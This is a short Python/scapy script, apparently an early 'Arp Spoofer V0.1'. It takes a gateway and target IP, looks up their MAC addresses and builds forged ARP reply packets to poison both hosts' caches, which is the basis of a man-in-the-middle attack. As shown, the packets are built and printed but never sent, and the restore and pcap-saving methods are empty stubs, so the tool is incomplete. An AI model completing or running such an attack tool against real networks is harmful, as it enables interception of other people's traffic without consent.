from scapy.all import *
from getmac import get_mac_address as gma


def get_mac(ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    else:
        return None


class ArpSpoofer:

    def __init__(self):
        print("Arp Spoofer V0.1")
        self.gateway = input("Input your gateway: \n")
        self.gatewayMac = get_mac(self.gateway)
        self.target = input("\ninput your target: \n")
        self.targetMac = get_mac(self.target)

        print(f"Target Mac: {self.targetMac}")
        print(f"Gateway Mac: {self.gatewayMac}")

    def arper(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.target
        poison_victim.hwdst = self.targetMac

        print(
            f"\nTarget ip: {poison_victim.psrc}\nIP Destination: {poison_victim.pdst}\nMAC Destination: {poison_victim.hwdst}\nMAC source: {poison_victim.hwsrc}")
        print("-" * 30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.target
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewayMac

        print(
            f"\nTarget ip: {poison_gateway.psrc}\nIP Destination: {poison_gateway.pdst}\nMAC Destination: {poison_gateway.hwdst}\nMAC source: {poison_gateway.hwsrc}")
        print("-" * 30)


    def restore(self):
        pass

    def save_to_pcap(self, bool):
        pass


if __name__ == "__main__":
    arper = ArpSpoofer()
